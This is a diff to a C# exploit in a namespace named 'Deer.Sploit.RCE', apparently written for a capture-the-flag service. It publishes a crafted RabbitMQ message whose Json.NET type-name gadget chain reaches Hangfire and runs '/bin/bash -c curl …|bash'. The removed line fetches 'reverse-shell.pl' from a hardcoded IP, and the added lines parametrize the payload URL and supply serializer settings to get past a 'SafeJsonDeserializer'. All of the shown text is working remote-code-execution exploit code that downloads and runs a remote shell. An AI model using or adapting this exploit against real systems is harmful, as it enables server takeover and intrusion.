@@ -31,7 +31,7 @@ namespace Deer.Sploit.RCE
             {
                 var exchange = bus.Advanced.ExchangeDeclare(logExchangeName, ExchangeType.Fanout, passive: true);
 
-                var properties = new MessageProperties{Type = "Deer.Models.Elasticsearch.ElasticResponse`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer"};
+                var properties = new MessageProperties{Type = "Deer.Models.Elasticsearch.SafeJsonDeserializer`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer"};
                 var body = Encoding.UTF8.GetBytes(BuildJson(exploitUrl));
 
                 bus.Advanced.Publish(exchange, "", false, properties, body);
@@ -68,7 +68,7 @@ namespace Deer.Sploit.RCE
                     Id = jobQueueId
                 },
                 InvocationData = "{\"Type\":\"System.Diagnostics.Process, System.Diagnostics.Process, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"Start\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\"}",
-                Arguments = "[\"\\\"/bin/bash\\\"\",\"\\\"-c \\\\\\\"curl http://192.168.88.253:8000/reverse-shell.pl|bash\\\\\\\"\\\"\"]",
+                Arguments = $"[\"\\\"/bin/bash\\\"\",\"\\\"-c \\\\\\\"curl {exploitUrl}|bash\\\\\\\"\\\"\"]",
                 CreatedAt = DateTime.UtcNow,
                 Id = jobId,
                 History = new List<StateHistoryDto>(),
@@ -106,7 +106,10 @@ namespace Deer.Sploit.RCE
 
             var hangfireJobServerJson = $"{{\"$type\":\"Deer.Hangfire.HangfireJobServer, Deer\", \"storage\" : {memoryStorageJson}}}";
 
-            return $"{{\"$type\":\"Deer.Models.Elasticsearch.ElasticResponse`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer\", \"json\": {JsonConvert.ToString(hangfireJobServerJson)}}}";
+            var contractResolverJson = "{\"$type\":\"Newtonsoft.Json.Serialization.DefaultContractResolver, Newtonsoft.Json\", \"DefaultMembersSearchFlags\" : 52}";
+            var jsonSerializerSettingsJson = $"{{\"$type\":\"Newtonsoft.Json.JsonSerializerSettings, Newtonsoft.Json\", \"TypeNameHandling\":4, \"ContractResolver\":{contractResolverJson}}}";
+            
+            return $"{{\"$type\":\"Deer.Models.Elasticsearch.SafeJsonDeserializer`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer\", \"json\": {JsonConvert.ToString(hangfireJobServerJson)}, \"settings\":{jsonSerializerSettingsJson}}}";
         }
     }
 }
